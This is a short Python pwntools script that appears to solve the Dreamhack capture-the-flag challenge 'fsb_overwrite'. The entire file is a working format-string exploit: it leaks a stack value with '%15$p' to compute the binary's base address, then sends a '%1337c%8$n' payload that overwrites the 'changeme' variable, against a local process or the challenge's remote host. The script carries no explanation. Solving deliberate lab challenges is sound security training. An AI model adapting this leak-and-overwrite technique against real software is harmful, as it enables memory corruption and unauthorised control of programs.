#!/usr/bin/env python3

from pwn import *

exe = ELF("./fsb_overwrite")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17201)

    return r

def main():
    r = conn()
    
    r.send(b"%15$p")

    main = int(r.recvline()[:-1], 16)

    bin_base = main - exe.symbols["main"]
    changeme = bin_base + exe.symbols["changeme"]
    
    payload = b"%1337c%8$n" + b"A" * 6 + p64(changeme)
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()